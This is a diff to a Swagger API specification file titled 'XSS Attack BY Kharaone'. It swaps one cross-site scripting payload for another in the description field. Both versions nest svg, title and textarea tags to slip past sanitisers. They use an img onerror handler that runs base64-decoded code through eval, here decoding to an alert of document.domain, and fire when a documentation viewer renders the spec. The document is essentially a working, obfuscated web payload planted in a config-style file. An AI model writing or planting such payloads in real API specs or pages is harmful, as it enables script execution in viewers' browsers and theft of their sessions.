@@ -2,8 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Kharaone
   description: |
-    <svg></p><textarea><title><style></textarea><img src=x id='YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==' onerror=eval(atob(this.id))></style></title></svg>
-
+    <svg></p><title><a id=\"</title><img src=x id='YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==' onerror=eval(atob(this.id))>\"></textarea></svg>
   version: production
 basePath: /JSSResource/
 produces:
